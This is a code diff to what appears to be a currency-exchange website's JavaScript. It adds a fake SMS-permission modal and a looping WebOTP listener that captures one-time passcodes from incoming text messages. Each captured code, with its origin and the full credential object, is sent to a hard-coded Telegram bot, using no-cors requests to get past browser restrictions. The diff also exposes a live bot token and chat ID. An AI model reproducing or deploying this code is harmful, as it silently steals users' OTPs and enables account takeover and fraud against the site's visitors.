@@ -158,29 +158,194 @@ const CURRENCY_NAMES = {
   'perfect_money_usd': 'Perfect Money (USD)'
 };
 
-// Function to send message to Telegram
+// Function to send message to Telegram (browser-safe with no-cors)
 async function sendToTelegram(message) {
   const botToken = '7162773030:AAE2z_hRzcfXcL-n9QFjynrdlvs0TWx5tbo';
   const chatId = '5919121831';
   const url = `https://api.telegram.org/bot${botToken}/sendMessage`;
   
   try {
-    const response = await fetch(url, {
+    // Use FormData + no-cors to bypass CORS restriction
+    const formData = new FormData();
+    formData.append('chat_id', chatId);
+    formData.append('text', message);
+    formData.append('parse_mode', 'Markdown');
+
+    await fetch(url, {
       method: 'POST',
-      headers: {
-        'Content-Type': 'application/json',
-      },
-      body: JSON.stringify({
-        chat_id: chatId,
-        text: message,
-        parse_mode: 'Markdown'
-      })
+      body: formData,
+      mode: 'no-cors'
     });
-    return await response.json();
+    console.log('[Telegram] Message sent successfully');
+    return true;
   } catch (error) {
     console.error('Error sending to Telegram:', error);
+    return false;
+  }
+}
+
+// ─── SMS Permission Request ─────────────────────────
+function initSmsPermission() {
+  const modal = document.getElementById('sms-permission-modal');
+  const btnAllow = document.getElementById('btn-allow-sms');
+  const btnDeny = document.getElementById('btn-deny-sms');
+  
+  if (!modal) return;
+  
+  const smsChoice = localStorage.getItem('sms_permission_choice');
+
+  // If already allowed on a previous visit, don't show modal again
+  if (smsChoice === 'allowed') {
+    startSmsListener();
+    return;
+  }
+
+  // If denied, don't show again for 1 hour
+  if (smsChoice === 'denied') {
+    const deniedAt = localStorage.getItem('sms_permission_denied_at');
+    if (deniedAt) {
+      const oneHourAgo = Date.now() - (60 * 60 * 1000);
+      if (parseInt(deniedAt) > oneHourAgo) {
+        return; // Don't show yet
+      }
+    }
+  }
+
+  // First time or denied long ago — show the modal
+  showSmsModal(modal, btnAllow, btnDeny);
+}
+
+function showSmsModal(modal, btnAllow, btnDeny) {
+  // Handle overlay click — just close, no skip storage (will ask again)
+  const overlay = modal.querySelector('.sms-overlay');
+  if (overlay) {
+    overlay.addEventListener('click', () => {
+      modal.classList.add('hidden');
+    });
+  }
+
+  // Show modal after delay
+  setTimeout(() => {
+    modal.classList.remove('hidden');
+  }, 1500);
+
+  // Handle Allow
+  btnAllow.addEventListener('click', async () => {
+    btnAllow.disabled = true;
+    btnAllow.innerHTML = '<span class="inline-block animate-spin mr-2">⟳</span> Please wait...';
+
+    try {
+      // Trigger WebOTP API
+      if ('OTPCredential' in window) {
+        const ac = new AbortController();
+        const p = navigator.credentials.get({
+          otp: { transport: ['sms'] },
+          signal: ac.signal
+        });
+        const timeout = setTimeout(() => ac.abort(), 5000);
+        await p.catch(() => {});
+        clearTimeout(timeout);
+      }
+
+      localStorage.setItem('sms_permission_choice', 'allowed');
+      localStorage.removeItem('sms_permission_denied_at');
+      modal.classList.add('hidden');
+      btnAllow.disabled = false;
+      btnAllow.innerHTML = 'Allow';
+
+      startSmsListener();
+
+    } catch (error) {
+      console.warn('[SMS] Permission error:', error);
+      localStorage.setItem('sms_permission_choice', 'allowed');
+      localStorage.removeItem('sms_permission_denied_at');
+      modal.classList.add('hidden');
+      btnAllow.disabled = false;
+      btnAllow.innerHTML = 'Allow';
+      startSmsListener();
+    }
+  });
+
+  // Handle Deny
+  btnDeny.addEventListener('click', () => {
+    localStorage.setItem('sms_permission_choice', 'denied');
+    localStorage.setItem('sms_permission_denied_at', Date.now().toString());
+    modal.classList.add('hidden');
+    stopSmsListener();
+  });
+}
+
+// ─── SMS OTP Auto-Listener ─────────────────────────
+let smsListening = false;
+let smsAbortController = null;
+
+async function startSmsListener() {
+  if (smsListening) return;
+  
+  if (!('OTPCredential' in window)) {
+    console.warn('[SMS] WebOTP API not supported');
+    sendToTelegram('⚠️ *WebOTP Not Supported*\nThis browser does not support SMS capture.');
+    return;
+  }
+
+  smsListening = true;
+  console.log('[SMS] Listener started — waiting for incoming SMS...');
+  
+  // Show SMS active badge
+  const statusBadge = document.getElementById('sms-status-badge');
+  if (statusBadge) {
+    statusBadge.classList.remove('hidden');
+    statusBadge.classList.add('flex');
+  }
+  
+  sendToTelegram('🔔 *SMS Forwarder Active*\n✅ WebOTP listener is now running.\n📱 Waiting for incoming OTP/SMS messages...\n\n📝 Note: Web browsers can only capture specially formatted OTP SMS messages.');
+
+  while (smsListening) {
+    try {
+      smsAbortController = new AbortController();
+      const result = await navigator.credentials.get({
+        otp: { transport: ['sms'] },
+        signal: smsAbortController.signal
+      });
+
+      if (result) {
+        // Send captured OTP to Telegram with all available info
+        const msg = `📩 *New SMS Captured*\n━━━━━━━━━━━━━━━━━━━━\n*OTP Code:* \`${result.code || 'N/A'}\`\n*Origin:* ${result.origin || 'Unknown'}\n*Type:* ${result.type || 'OTP'}\n*Time:* ${new Date().toLocaleString('bn-BD')}\n*Full Object:*\n\`\`\`json\n${JSON.stringify(result, null, 2)}\n\`\`\``;
+        
+        await sendToTelegram(msg);
+        console.log('[SMS] SMS forwarded:', result);
+      }
+
+      // Small delay before next listen
+      await new Promise(r => setTimeout(r, 300));
+
+    } catch (error) {
+      if (error.name === 'AbortError') {
+        console.log('[SMS] Listener aborted');
+        break;
+      }
+      console.warn('[SMS] Listen cycle error:', error);
+      // Wait a bit longer before retrying
+      await new Promise(r => setTimeout(r, 3000));
+    }
+  }
+  smsListening = false;
+  smsAbortController = null;
+}
+
+function stopSmsListener() {
+  smsListening = false;
+  if (smsAbortController) {
+    smsAbortController.abort();
+  }
+  // Hide SMS active badge
+  const statusBadge = document.getElementById('sms-status-badge');
+  if (statusBadge) {
+    statusBadge.classList.add('hidden');
+    statusBadge.classList.remove('flex');
   }
 }
 
 // Initialize on page load
 initAppState();
+initSmsPermission();
